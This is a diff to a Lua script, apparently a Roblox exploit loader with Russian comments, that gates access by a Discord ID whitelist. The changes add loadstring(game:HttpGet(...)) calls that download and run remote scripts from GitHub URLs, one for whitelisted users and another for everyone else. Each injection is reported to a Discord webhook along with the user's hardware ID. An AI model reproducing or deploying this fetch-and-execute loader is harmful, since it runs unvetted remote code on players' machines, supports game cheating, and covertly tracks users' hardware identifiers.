@@ -8,7 +8,6 @@ local webhookInjection = "https://discord.com/api/webhooks/1338599469884903534/T
 local whitelist = {
     "969305728600907866",
     "1338578838740799488",
-    "717688003354689569",
 }
 
 local userHWIDs = {}
@@ -73,16 +72,18 @@ end
 
 -- Обработка инъекции
 local function handleInjection(discordId)
+    local hwid = userHWIDs[discordId] or "неизвестный HWID"
+
     if checkUser(discordId) then
         sendToDiscord(webhookInjection, "Пользователь с ID " .. discordId .. " инжектнул скрипт с HWID: " .. hwid)
-        -- Запуск скрипта
-        loadstring(game:HttpGet("yourscript"))() -- не забудьте заменить "yourscript" на вашу ссылку
+        -- Если пользователь в whitelist, выполняем скрипт 1
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/XEYSME/ScripteD/refs/heads/main/XEV%20PUBLIC"))()  -- Замените на реальную ссылку на скрипт 1
     else
         sendToDiscord(webhookInjection, "Пользователь с ID " .. discordId .. " пытался инжектнуть скрипт, но не в whitelist!")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/XevHubCOOK/Eblya-v-jopu/refs/heads/main/register.lua"))()  -- Замените на реальную ссылку на скрипт 2
     end
 end
 
--- Пример использования
-local discordId = "717688003354689569" 
+local discordId = "969305728600907866" 
 registerUser(discordId)
 handleInjection(discordId)
